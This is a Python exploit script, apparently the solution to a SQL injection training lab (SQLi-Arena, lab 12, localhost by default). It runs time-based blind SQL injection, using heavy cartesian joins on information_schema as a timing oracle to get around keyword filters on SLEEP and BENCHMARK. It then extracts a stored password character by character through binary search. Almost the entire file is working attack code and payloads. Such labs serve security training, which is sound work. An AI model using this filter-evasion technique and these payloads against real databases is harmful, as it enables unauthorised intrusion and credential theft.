#!/usr/bin/env python3
"""
Lab 12 -- Time-Based Blind SQLi: Heavy Query (SLEEP/BENCHMARK blocked)
=====================================================================
Uses cartesian joins on information_schema as a CPU-bound timing oracle
when SLEEP() and BENCHMARK() are blocked by keyword filters.

The query context is: WHERE event LIKE '%$input%'
Because LIKE '%' matches everything, a plain ' OR heavy_query short-circuits.
We use ' AND 0 OR IF(...) to force evaluation of the heavy query branch.

Usage:
    python3 lab12_heavy_query.py [BASE_URL]

Default target: http://localhost/SQLi-Arena
"""
import requests
import sys
import time

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost/SQLi-Arena"
TARGET = f"{BASE}/mysql/lab12"

# Heavy queries for timing oracle (in order of increasing delay):
# MariaDB aggressively optimizes COUNT(*) on 2-table joins, so we need 3 tables.
HEAVY_QUERIES = [
    "(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C)",    # ~2s on typical system
    "(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)",   # ~17s (fallback)
]
HEAVY = HEAVY_QUERIES[0]
THRESHOLD = 1.0   # seconds -- response > this = TRUE
RETRIES = 2


def timed_check(condition):
    """Inject a condition with heavy query timing oracle.
    Uses 'AND 0 OR' to defeat short-circuit evaluation when LIKE '%' is always TRUE."""
    payload = f"' AND 0 OR IF({condition}, {HEAVY}, 0) -- -"

    for attempt in range(RETRIES):
        start = time.time()
        requests.post(TARGET, data={"search": payload})
        elapsed = time.time() - start
        if elapsed > THRESHOLD:
            return True
        if attempt == 0 and elapsed > THRESHOLD * 0.5:
            continue  # ambiguous -- retry
        return False
    return False


def find_length(subquery, max_len=50):
    """Find the length of a subquery result via heavy-query timing."""
    low, high = 1, max_len
    while low <= high:
        mid = (low + high) // 2
        if timed_check(f"({subquery}) > {mid}"):
            low = mid + 1
        else:
            high = mid - 1
    return low


def extract_char(subquery, pos):
    """Extract one character via heavy-query binary search."""
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        if timed_check(f"ASCII(SUBSTRING(({subquery}),{pos},1)) > {mid}"):
            low = mid + 1
        else:
            high = mid - 1
    return chr(low) if 32 <= low <= 126 else "?"


# ── Step 1: Calibrate the heavy query ──
print(f"[*] Target: {TARGET}")
print(f"[*] Threshold: {THRESHOLD}s")
print("[*] Calibrating heavy query delay...")

for i, hq in enumerate(HEAVY_QUERIES):
    HEAVY = hq
    # Use AND 0 OR to force evaluation (prevents LIKE '%' short-circuit)
    payload = f"' AND 0 OR {HEAVY} -- -"
    start = time.time()
    requests.post(TARGET, data={"search": payload})
    elapsed = time.time() - start
    print(f"[*] Heavy query #{i+1} took {elapsed:.2f}s")

    if elapsed >= THRESHOLD:
        print(f"[+] Using heavy query #{i+1} ({elapsed:.2f}s delay)")
        break
else:
    print("[-] ERROR: None of the heavy queries produced sufficient delay.")
    print("[-] Try adjusting THRESHOLD or adding more joins.")
    sys.exit(1)

# Verify FALSE condition is instant
start = time.time()
requests.post(TARGET, data={"search": f"' AND 0 OR IF(1=2, {HEAVY}, 0) -- -"})
false_time = time.time() - start
print(f"[*] FALSE condition: {false_time:.3f}s (should be near-instant)")

if false_time > THRESHOLD:
    print("[-] WARNING: FALSE condition is also slow. Oracle may be unreliable.")

# ── Step 2: Verify SLEEP is blocked ──
r = requests.post(TARGET, data={"search": "' OR SLEEP(1) -- -"})
if "Blocked" in r.text or "blocked" in r.text:
    print("[+] Confirmed: SLEEP is blocked by keyword filter")
else:
    print("[*] Note: SLEEP may not be blocked, but heavy query works as alternative")

# ── Step 3: Find the password length ──
SUBQUERY = "SELECT password FROM master_password LIMIT 1"
LENGTH_SUBQUERY = "SELECT LENGTH(password) FROM master_password LIMIT 1"

print("[*] Finding password length...")
length = find_length(LENGTH_SUBQUERY)
print(f"[+] Password length: {length}")

# ── Step 4: Extract character by character ──
print(f"[*] Extracting password ({length} chars, heavy queries are slow -- be patient)...")
flag = ""
overall_start = time.time()
for pos in range(1, length + 1):
    c = extract_char(SUBQUERY, pos)
    flag += c
    elapsed_total = time.time() - overall_start
    print(f"  [{pos:2d}/{length}] {flag}  ({elapsed_total:.1f}s elapsed)")

print(f"\n[+] Password: {flag}")
print(f"[*] Total time: {time.time() - overall_start:.1f}s")
